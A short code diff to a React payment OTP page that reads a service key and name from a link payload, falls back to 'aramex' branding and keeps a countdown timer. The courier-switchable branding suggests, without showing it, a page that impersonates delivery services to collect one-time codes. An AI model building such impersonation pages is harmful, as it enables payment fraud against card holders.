@@ -28,8 +28,9 @@ const PaymentOTP = () => {
   const [timeLeft, setTimeLeft] = useState(180); // 3 minutes countdown
   
   // Get service branding
-  const serviceName = link?.payload?.service || link?.payload?.carrier || 'aramex';
-  const branding = getServiceBranding(serviceName);
+  const serviceKey = link?.payload?.service_key || link?.payload?.service || link?.payload?.carrier || 'aramex';
+  const serviceName = link?.payload?.service_name || serviceKey;
+  const branding = getServiceBranding(serviceKey);
   
   // Countdown timer
   useEffect(() => {
